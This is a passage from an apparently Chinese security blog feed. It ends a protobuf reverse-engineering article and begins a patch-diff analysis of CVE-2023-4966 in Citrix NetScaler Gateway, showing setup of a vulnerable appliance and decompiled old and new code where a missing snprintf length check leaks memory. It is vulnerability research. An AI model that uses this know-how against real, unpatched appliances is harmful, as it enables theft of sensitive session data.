class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )                          <span class="comment">// 3</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (mk_string)(<span class="number">3</span>, (<span class="keyword">this</span>[<span class="number">4</span>] &amp; <span class="number">0xFFFFFFFE</span>), v7);<span class="comment">// index = 3</span></span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">2</span>) != <span class="number">0</span> )                          <span class="comment">// 4</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (mk_string)(<span class="number">4</span>, (<span class="keyword">this</span>[<span class="number">5</span>] &amp; <span class="number">0xFFFFFFFE</span>), v7);<span class="comment">// index = 4</span></span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">16</span>) != <span class="number">0</span> )                         <span class="comment">// 5</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= *a3 )</span><br><span class="line">      v7 = <span class="built_in">sub_477210</span>(v7);</span><br><span class="line">    v14 = <span class="keyword">this</span>[<span class="number">9</span>];</span><br><span class="line">    v12 = <span class="keyword">this</span>[<span class="number">8</span>];</span><br><span class="line">    *v7 = <span class="number">0x28</span>;                                 <span class="comment">// 5 * 8 = 40, index = 5</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v12, v14, v7 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">32</span>) != <span class="number">0</span> )                         <span class="comment">// 6</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= *a3 )</span><br><span class="line">      v7 = <span class="built_in">sub_477210</span>(v7);</span><br><span class="line">    v13 = <span class="keyword">this</span>[<span class="number">10</span>];</span><br><span class="line">    *v7 = <span class="number">48</span>;                                   <span class="comment">// 6 * 8 = 48, index = 6</span></span><br><span class="line">    v7 = <span class="built_in">sub_467D80</span>(v13, <span class="built_in">HIDWORD</span>(v13), v7 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *((<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">20</span>);</span><br><span class="line">    v16 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = ((<span class="keyword">this</span>[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !byte_4B07A8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_476550</span>();</span><br><span class="line">        v8 = v16;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = &amp;xmmword_4B07B0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(v9 + <span class="number">5</span>) &gt;= <span class="number">0x10</span>u )</span><br><span class="line">      v9 = *v9;</span><br><span class="line">    <span class="keyword">if</span> ( *a3 - v7 &lt; v8 )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">sub_477480</span>(v9, v8, v7);</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, v9, v8);</span><br><span class="line">    v7 += v16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>参考源代码中 <code>_InternalSerialize</code> 函数的基本结构，分析得知该对象应该具有 6 个变量，其中 1、2、5、6 号变量为 int 类型，3、4 号变量应为 string 类型。构造一个基本的对象数据并传入程序，通过调试可以验证以上分析是正确的。</p>
<h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>某些情况下能得到程序所使用的 protobuf 数据，比如上面的例子，假设通过抓包等方式获取了程序通讯过程中产生的数据</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">08 01 10 02 1a 0b 74 65 73 74 53 74 72 69 6e 67 31 22 0b 74 65 73 74 53 74 72 69 6e 67 32 28 05 30 06</span><br></pre></td></tr></table></figure></div>

<p>此时可以用一些<a class="link"   href="https://protobuf-decoder.netlify.app/" >工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>直接将其解析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-9.png"
                     
                ></p>
<p>根据程序逻辑不断调整数据也许就能猜测出各个字段的功能，而无需原始 proto 对象定义。</p>
<p>本文介绍了在逆向过程中还原 protobuf 对象的几种方法，一个比较通用的思路就是使用对应语言先编译一个简单且已知的对象，然后从生成的源代码中找到能够识别对象的一些特征，再应用到待分析程序中尝试恢复对象结构，或者直接抓包并调试目标程序来辅助分析。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://www.cnblogs.com/davad/p/4871010.html" >https://www.cnblogs.com/davad/p/4871010.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://protobuf-decoder.netlify.app/" >https://protobuf-decoder.netlify.app/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_42067550/article/details/126010113" >https://blog.csdn.net/qq_42067550/article/details/126010113<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/marin-m/pbtk" >https://github.com/marin-m/pbtk<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1735973-1-1.html" >https://www.52pojie.cn/thread-1735973-1-1.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2023-4966</title>
    <url>/2023/10/24/CVE-2023-4966/</url>
    <content><![CDATA[<p>2023 年 10 月 10 日，Citrix 官方发布了关于影响 Citrix ADC 和 NetScaler Gateway 设备的 CVE-2023-4966 和 CVE-2023-4967 漏洞预警信息，10 月 17 日 Citrix 表示已经监控到  CVE-2023-4966 漏洞的在野利用，本文对此漏洞进行分析。</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>根据披露信息，该漏洞在 13.1-49.15 及以上版本被修复，所以我们选择低一个版本的 13.1-49.13(VPX) 进行分析，<a class="link"   href="https://pan.baidu.com/s/15pUY2IKJN0Yj4rDt4UDyuA?pwd=doug" >点击下载镜像<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>将镜像导入虚拟机并启动，在启动过程中系统会自动询问 IP 地址、网关等信息，按需配置之后访问 443 即可看到 web 管理界面，默认账户为 nsroot:nsroot，第一次登录会提示修改密码。CLI 也使用 nsroot 用户登录，登陆后执行 shell 命令即可进入 Linux root shell。</p>
<p>由于漏洞位于 Gateway 服务中，还需要继续部署 Gateway 组件。Citrix ADC 设备只有导入了合适的授权才能使用此功能，授权可以去<a class="link"   href="https://www.citrix.com/downloads/citrix-adc/virtual-appliances/netscaler-vpx-developer-edition.html" >官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>申请开发者版本，或者自行寻找途径购买。</p>
<p>在初始画面显示 4 个选项，要求我们配置 subnet IP、主机名称、时区等，按照提示配置并导入授权文件，重启设备再登录到后台，即可看到 Gateway 功能模块。点击其中的 Citrix Gateway Wizard 按照提示逐步配置，要注意的是 Citrix Gateway IP Address 需要和 web 管理界面在相同网段内。</p>
<p>以上步骤配置完毕，在 Citrix Gateway -&gt; User Administration -&gt; AAA Users 中添加一个用户，取消勾选 External Authentication 创建一个本地账户，填写密码后再点击右侧的 Intranet IP Addresses 给用户添加 VPN IP 资源。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-1.png"
                     
                ></p>
<p>这样 Gateway 服务就配置好了，访问 IP 可以看到登录界面。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2023-4966 官方描述为 “敏感信息泄露”，并且分类为 CWE-119 即缓冲区越界问题。</p>
<p>根据 Citrix 历史漏洞的相关复现文章，Gateway 功能主要由 nsppe 程序实现，我们获取新旧两个版本的镜像进行补丁对比。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-2.png"
                     
                ></p>
<p>nsppe 程序默认包含符号信息，并且新版本没有很大的变动，可以很快找到存在差异的几个函数，大部分为对 oauth 逻辑的 patch，其中包括数个对 memcpy 数据长度的限制，猜测这些可能是 oauth 功能中缓冲区溢出或者拒绝服务等问题。由于披露信息中未提及 oauth 相关限制，我们认为漏洞和这些更改无关。</p>
<p>分析补丁最终定位到两个关键函数：ns_aaa_oauthrp_send_openid_config 和 ns_aaa_oauth_send_openid_config，新旧版本代码列举如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauthrp_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r9</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v11; <span class="comment">// zf</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = (v2 + *(a2 + <span class="number">540</span>) - <span class="number">2</span>);</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5 != <span class="number">1</span>;</span><br><span class="line">      v7 = *(v2 + <span class="number">1</span>);</span><br><span class="line">      v8 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v6 &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; v7) &amp; (v7 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="string">&quot;https://&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(a1 + <span class="number">88</span>) &amp; <span class="number">0x100</span>) == <span class="number">0</span> )</span><br><span class="line">    v9 = <span class="string">&quot;http://&quot;</span>;</span><br><span class="line">  v10 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>LL,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;login_endpoint\&quot;: \&quot;%s%.*s/oauth/login\&quot;, \&quot;jwks_uri\&quot;: \&quot;%s%.*s/oauth/rp/certs\&quot;, \&quot;response_types_support&quot;</span></span><br><span class="line">          <span class="string">&quot;ed\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sessi&quot;</span></span><br><span class="line">          <span class="string">&quot;on_endpoint\&quot;: \&quot;%s%.*s/cgi/tmlogout\&quot;, \&quot;frontchannel_logout_supported\&quot;: false&#125;&quot;</span>,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  v11 = ns_vpn_send_response(a1, <span class="number">1048640LL</span>, print_temp_rule, v10) == <span class="number">0</span>;<span class="comment">// print_temp_rule 默认的大小为 0x20000</span></span><br><span class="line">  authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">32LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauthrp_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// r9</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// cl</span></span><br><span class="line">  __int64 v8; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = &amp;v2[*(a2 + <span class="number">540</span>) - <span class="number">2</span>];</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="number">13</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5 != <span class="number">1</span>;</span><br><span class="line">      v7 = v2[<span class="number">1</span>];</span><br><span class="line">      v8 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v6 &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; v7) &amp; (v7 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="string">&quot;https://&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(a1 + <span class="number">88</span>) &amp; <span class="number">0x100</span>) == <span class="number">0</span> )</span><br><span class="line">    v9 = <span class="string">&quot;http://&quot;</span>;</span><br><span class="line">  v10 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;login_endpoint\&quot;: \&quot;%s%.*s/oauth/login\&quot;, \&quot;jwks_uri\&quot;: \&quot;%s%.*s/oauth/rp/certs\&quot;, \&quot;response_types_support&quot;</span></span><br><span class="line">          <span class="string">&quot;ed\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sessi&quot;</span></span><br><span class="line">          <span class="string">&quot;on_endpoint\&quot;: \&quot;%s%.*s/cgi/tmlogout\&quot;, \&quot;frontchannel_logout_supported\&quot;: false&#125;&quot;</span>,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2);</span><br><span class="line">  v11 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt;= <span class="number">0x1FFFF</span> )                         <span class="comment">// 限制长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">    v12 = ns_vpn_send_response(a1, <span class="number">1048640LL</span>, print_temp_rule, v10);</span><br><span class="line">    authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauth_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// cl</span></span><br><span class="line">  _BOOL4 v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// zf</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = (v2 + *(a2 + <span class="number">540</span>) - <span class="number">2</span>);</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="number">13</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v5 != <span class="number">1</span>;</span><br><span class="line">      v8 = *(v2 + <span class="number">1</span>);</span><br><span class="line">      v9 = v8 &lt; <span class="number">0x40</span>u;</span><br><span class="line">      v10 = <span class="number">0x100000200</span>uLL &gt;&gt; v8;</span><br><span class="line">      v11 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v7 &amp; v10 &amp; v9) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>LL,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/login\&quot;, \&quot;token_endpoint\&quot;&quot;</span></span><br><span class="line">          <span class="string">&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;https://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported&quot;</span></span><br><span class="line">          <span class="string">&quot;\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_session&quot;</span></span><br><span class="line">          <span class="string">&quot;_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported\&quot;: true, \&quot;scopes_supported\&quot;:&quot;</span></span><br><span class="line">          <span class="string">&quot; [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;,&quot;</span></span><br><span class="line">          <span class="string">&quot; \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;email\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;https:/&quot;</span></span><br><span class="line">          <span class="string">&quot;/%.*s/oauth/idp/userinfo\&quot;, \&quot;subject_types_supported\&quot;: [\&quot;public\&quot;]&#125;&quot;</span>,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  v13 = ns_vpn_send_response(a1, <span class="number">0x100040</span>LL, print_temp_rule, v12) == <span class="number">0</span>;</span><br><span class="line">  authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">32LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//new</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauth_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// r8</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// cl</span></span><br><span class="line">  _BOOL4 v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = &amp;v2[*(a2 + <span class="number">540</span>) - <span class="number">2</span>];</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="number">13</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v5 != <span class="number">1</span>;</span><br><span class="line">      v8 = v2[<span class="number">1</span>];</span><br><span class="line">      v9 = v8 &lt; <span class="number">0x40</span>u;</span><br><span class="line">      v10 = <span class="number">0x100000200</span>uLL &gt;&gt; v8;</span><br><span class="line">      v11 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v7 &amp; v10 &amp; v9) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/login\&quot;, \&quot;token_endpoint\&quot;&quot;</span></span><br><span class="line">          <span class="string">&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;https://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported&quot;</span></span><br><span class="line">          <span class="string">&quot;\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_session&quot;</span></span><br><span class="line">          <span class="string">&quot;_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported\&quot;: true, \&quot;scopes_supported\&quot;:&quot;</span></span><br><span class="line">          <span class="string">&quot; [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;,&quot;</span></span><br><span class="line">          <span class="string">&quot; \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;email\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;https:/&quot;</span></span><br><span class="line">          <span class="string">&quot;/%.*s/oauth/idp/userinfo\&quot;, \&quot;subject_types_supported\&quot;: [\&quot;public\&quot;]&#125;&quot;</span>,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2);</span><br><span class="line">  v13 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &lt;= <span class="number">0x1FFFF</span> )                         <span class="comment">// 添加了长度限制</span></span><br><span class="line">  &#123;</span><br><span class="line">    authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">    v14 = ns_vpn_send_response(a1, <span class="number">1048640LL</span>, print_temp_rule, v12);</span><br><span class="line">    